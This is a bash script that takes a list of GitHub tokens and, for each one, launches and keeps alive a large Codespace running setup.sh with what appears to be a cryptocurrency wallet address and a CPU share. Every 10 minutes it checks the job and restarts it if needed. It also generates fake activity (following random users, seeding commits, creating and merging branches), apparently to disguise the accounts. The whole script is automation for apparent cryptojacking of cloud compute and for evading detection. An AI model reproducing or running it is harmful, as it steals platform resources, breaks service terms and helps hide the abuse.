REPO="niaalae/dock"
BRANCH="main"
MACHINE_TYPE="standardLinux32gb"
SETUP_CMD='sudo /workspaces/dock/setup.sh 49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F 85'
SEED_REPO_NAME="seeding-repo"

if [ $# -lt 1 ]; then
  echo "Usage: $0 <gh_token> [gh_token ...] or $0 <token_file>"
  exit 1
fi

# If first arg is a file, read tokens from it
if [ -f "$1" ]; then
  TOKENS=( $(grep -v '^#' "$1" | grep -v '^$') )
else
  TOKENS=( "$@" )
fi

run_instance() {
  GH_TOKEN="$1"
  echo "$GH_TOKEN" | gh auth login --with-token
  if [ $? -ne 0 ]; then
    echo "GitHub authentication failed for token $GH_TOKEN."
    return 1
  fi

  # Get username for seeding
  GH_USER=$(gh api user -q .login)
  echo "Logged in as $GH_USER"

  # Generate unique worker name for this instance
  # Format: user-shorttoken-timestamp
  TOKEN_HASH=$(echo -n "$GH_TOKEN" | md5sum | head -c 6)
  WORKER_NAME="${GH_USER}-${TOKEN_HASH}-$(date +%s)"
  echo "Using unique worker name: $WORKER_NAME"

  ensure_codespace() {
    CODESPACE_NAME=$(gh codespace list | grep "$REPO" | grep "$BRANCH" | head -n1 | awk '{print $1}')
    if [ -z "$CODESPACE_NAME" ]; then
      echo "No existing codespace found. Creating a new one..."
      CREATE_OUTPUT=$(gh codespace create -R "$REPO" -b "$BRANCH" -m "$MACHINE_TYPE" 2>&1)
      # Check for billing issue error
      if echo "$CREATE_OUTPUT" | grep -q "HTTP 402: Usage of this codespace is currently disallowed"; then
        echo "Billing issue detected. Exiting script."
        exit 1
      fi
      CODESPACE_NAME=$(gh codespace list | grep "$REPO" | grep "$BRANCH" | head -n1 | awk '{print $1}')
      if echo "$CREATE_OUTPUT" | grep -q "Usage not allowed"; then
        echo "Codespace creation not allowed. Checking for running codespaces..."
        CODESPACE_NAME=$(gh codespace list | grep "$REPO" | grep "$BRANCH" | grep "Available" | head -n1 | awk '{print $1}')
        if [ -z "$CODESPACE_NAME" ]; then
          echo "No running codespace available. Exiting."
          return 1
        fi
        echo "Logging into existing running codespace: $CODESPACE_NAME"
      elif [ -z "$CODESPACE_NAME" ]; then
        echo "Failed to create codespace."
        return 1
      else
        echo "Created codespace: $CODESPACE_NAME"
      fi
    else
      echo "Using codespace: $CODESPACE_NAME"
    fi

    echo "Waiting for setup.sh to be available in the codespace..."
    while true; do
      gh codespace ssh -c $CODESPACE_NAME -- ls /workspaces/dock/setup.sh >/dev/null 2>&1
      if [ $? -eq 0 ]; then
        echo "setup.sh found. Proceeding."
        break
      fi
      # Check if codespace still exists to avoid infinite loop on 404
      EXISTS=$(gh codespace list | awk '{print $1}' | grep -Fx "$CODESPACE_NAME")
      if [ -z "$EXISTS" ]; then
        echo "Codespace $CODESPACE_NAME disappeared while waiting for setup.sh. Retrying creation..."
        return 2 # Special exit code for "retry everything"
      fi
      echo "setup.sh not found yet. Waiting 5 seconds..."
      sleep 5
    done
    return 0
  }

  while true; do
    ensure_codespace
    RET=$?
    if [ $RET -eq 0 ]; then
      break
    elif [ $RET -eq 1 ]; then
      return 1
    fi
    # If RET is 2, it will loop and try ensure_codespace again
  done

  sync_and_run() {
    echo "Starting/Restarting setup.sh with worker name $WORKER_NAME..."
    ssh_cmd="gh codespace ssh -c $CODESPACE_NAME -- bash -c '$SETUP_CMD $WORKER_NAME; tail -f /dev/null'"
    $ssh_cmd &
    SSH_PID=$!
  }
  sync_and_run

  CHECK_COUNT=0
  while true; do
    sleep 600 # Reconnect every 10 minutes
    CHECK_COUNT=$((CHECK_COUNT + 1))
    echo "Check #$CHECK_COUNT at $(date)"

    # 0. Verify codespace still exists (handle 404)
    EXISTS=$(gh codespace list | awk '{print $1}' | grep -Fx "$CODESPACE_NAME")
    if [ -z "$EXISTS" ]; then
      echo "Codespace $CODESPACE_NAME not found (404). Recreating..."
      if [ -n "$SSH_PID" ]; then kill $SSH_PID 2>/dev/null; fi
      while true; do
        ensure_codespace
        RET=$?
        if [ $RET -eq 0 ]; then break; fi
        if [ $RET -eq 1 ]; then return 1; fi
        sleep 10
      done
      sync_and_run
      continue # Skip the rest of this check and wait for next interval
    fi

    # 1. Check if Docker is running
    DOCKER_RUNNING=$(gh codespace ssh -c $CODESPACE_NAME -- docker ps -q 2>/dev/null)
    if [ -z "$DOCKER_RUNNING" ]; then
      echo "Docker is not running or no containers active. Rerunning setup.sh..."
      if [ -n "$SSH_PID" ]; then kill $SSH_PID 2>/dev/null; fi
      sync_and_run
    else
      echo "Docker is running."
    fi

    # 2. Seeding Logic (Every 3 checks)
    if [ $((CHECK_COUNT % 3)) -eq 0 ]; then
      echo "Performing seeding tasks..."
      
      # Randomly follow people
      echo "Fetching random users to follow..."
      RANDOM_USERS=$(gh api "search/users?q=type:user&per_page=10&page=$((RANDOM % 10 + 1))" -q '.items[].login' 2>/dev/null | shuf -n $((RANDOM % 3 + 1)))
      if [ -n "$RANDOM_USERS" ]; then
        for USER_TO_FOLLOW in $RANDOM_USERS; do
          if [ "$USER_TO_FOLLOW" != "$GH_USER" ]; then
            echo "Following $USER_TO_FOLLOW..."
            gh api -X PUT "user/following/$USER_TO_FOLLOW" >/dev/null 2>&1
          fi
        done
      else
        echo "Failed to fetch random users."
      fi

      # Check if repo exists, if not create it
      REPO_EXISTS=$(gh repo list --json name -q ".[] | select(.name == \"$SEED_REPO_NAME\") | .name" 2>/dev/null)
      if [ -z "$REPO_EXISTS" ]; then
        echo "Creating seeding repository: $SEED_REPO_NAME"
        gh repo create "$SEED_REPO_NAME" --public --add-readme >/dev/null 2>&1
        sleep 5 # Wait for repo to be ready
      fi

      # Commit at least 2 times
      for i in 1 2; do
        echo "Making commit $i to $SEED_REPO_NAME..."
        gh api -X PUT "repos/$GH_USER/$SEED_REPO_NAME/contents/seed_${CHECK_COUNT}_${i}.txt" \
          -F message="Seeding commit $CHECK_COUNT $i" \
          -F content=$(echo "Seed data $RANDOM at $(date)" | base64) >/dev/null 2>&1
      done
    fi

    # 3. Branching Logic (15th check)
    if [ $CHECK_COUNT -eq 15 ]; then
      NEW_BRANCH="feature-branch-$(date +%s)"
      echo "Creating new branch: $NEW_BRANCH"
      MAIN_SHA=$(gh api "repos/$GH_USER/$SEED_REPO_NAME/git/ref/heads/main" -q '.object.sha' 2>/dev/null)
      if [ -n "$MAIN_SHA" ]; then
        gh api -X POST "repos/$GH_USER/$SEED_REPO_NAME/git/refs" \
          -F ref="refs/heads/$NEW_BRANCH" \
          -F sha="$MAIN_SHA" >/dev/null 2>&1
        
        # Make a commit on the new branch
        gh api -X PUT "repos/$GH_USER/$SEED_REPO_NAME/contents/branch_work.txt" \
          -F message="Work on $NEW_BRANCH" \
          -F content=$(echo "Branch data $RANDOM at $(date)" | base64) \
          -F branch="$NEW_BRANCH" >/dev/null 2>&1
      else
        echo "Failed to get main branch SHA for branching."
      fi
    fi

    # 4. Merging Logic (20th check)
    if [ $CHECK_COUNT -eq 20 ]; then
      # Find the latest branch created (if any)
      LATEST_BRANCH=$(gh api "repos/$GH_USER/$SEED_REPO_NAME/branches" -q '.[].name' 2>/dev/null | grep "feature-branch-" | tail -n 1)
      if [ -n "$LATEST_BRANCH" ]; then
        echo "Merging branch $LATEST_BRANCH into main..."
        gh api -X POST "repos/$GH_USER/$SEED_REPO_NAME/merges" \
          -F base="main" \
          -F head="$LATEST_BRANCH" \
          -F commit_message="Merging $LATEST_BRANCH into main" >/dev/null 2>&1
        
        echo "Cycle complete. Resetting check count."
        CHECK_COUNT=0
      else
        echo "No feature branch found to merge."
        # Reset anyway to keep the cycle? Or keep counting?
        # Let's reset to keep the 20-check cycle consistent.
        CHECK_COUNT=0
      fi
    fi

    # Reconnect SSH if it died
    if ! kill -0 $SSH_PID 2>/dev/null; then
      echo "SSH session closed. Attempting to reconnect..."
      sync_and_run
    fi
  done
}

for TOKEN in "${TOKENS[@]}"; do
  run_instance "$TOKEN" &
done
wait
